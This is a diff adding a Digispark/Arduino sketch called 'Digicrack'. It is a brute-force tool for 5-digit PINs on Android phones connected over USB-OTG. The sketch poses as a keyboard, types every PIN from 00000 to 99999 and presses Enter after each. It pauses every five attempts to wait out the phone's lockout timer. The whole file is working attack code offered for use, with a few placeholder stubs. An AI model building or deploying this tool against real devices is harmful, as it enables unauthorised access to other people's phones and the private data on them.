@@ -1,0 +1,52 @@
+
+
+/*===============================================
+Digicrack -  5-Digit PIN Brute Force attack 
+for USB-OTG Android devices. 
+     By -- Sachin Kumar Pandey
+==================================================*/
+
+
+#include "DigiKeyboard.h"
+
+int pin[] = {1, 2, 3, 4, 5}; // Example PIN, not used in this brute-force
+int count = 0;
+bool pinEntered = true; // Set to true to skip unused enterPIN() logic
+
+void setup() {
+  DigiKeyboard.delay(3000); // Initial delay
+}
+
+void loop() {
+  if (!pinEntered) {
+    enterPIN(); // Placeholder
+    return;
+  }
+
+  if (!isScreenLocked()) {
+    for (int i = 0; i <= 99999; i++) {
+      char passcode[6]; // 5 digits + null terminator
+      sprintf(passcode, "%05d", i); // Format with leading zeros
+
+      DigiKeyboard.print(passcode);     // Send the passcode
+      DigiKeyboard.sendKeyStroke(KEY_ENTER); // Press Enter
+      DigiKeyboard.delay(3000);         // Delay between attempts
+
+      count++;
+      if (count == 5) {
+        DigiKeyboard.delay(31000); // 30-second delay every 5 attempts
+        count = 0;
+      }
+    }
+  }
+}
+
+void enterPIN() {
+  // Optional: implement PIN entry here if needed
+}
+
+bool isScreenLocked() {
+  // Placeholder: replace with real detection if available
+  return false;
+}
+      
